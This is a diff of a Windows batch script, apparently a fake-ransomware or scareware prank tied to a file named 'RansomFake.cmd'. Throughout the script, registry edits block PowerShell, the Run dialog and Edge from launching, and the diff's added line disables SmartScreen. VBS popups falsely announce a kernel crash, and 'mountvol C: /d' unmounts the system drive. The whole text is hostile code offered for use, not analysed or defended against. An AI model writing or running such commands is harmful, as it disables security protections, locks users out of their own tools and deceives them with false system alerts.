@@ -1,5 +1,6 @@
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /t REG_DWORD  /v "DisallowRun" /reg:32 /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /t REG_DWORD /v "SmartScreenEnabled" /reg:32 /d 0 /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "1" /d "powershell.exe" /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "2" /d "run.exe" /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "3" /d "msedge.exe" /f
@@ -17,6 +18,7 @@ Unblock-File "RansomFake.cmd"
 echo "MsgBox "Windows is in crash state and the kernel is unavalabile!" ^& vbCrLf ,(0), "78ftc3sa9"" > corruption.vbs
 echo "MsgBox "turn off nowf avoiding any corruption!" ^& vbCrLf ,262192, "ctu4st6f"" > corruption.vbs 
 mountvol C: /d
+
 
 
 
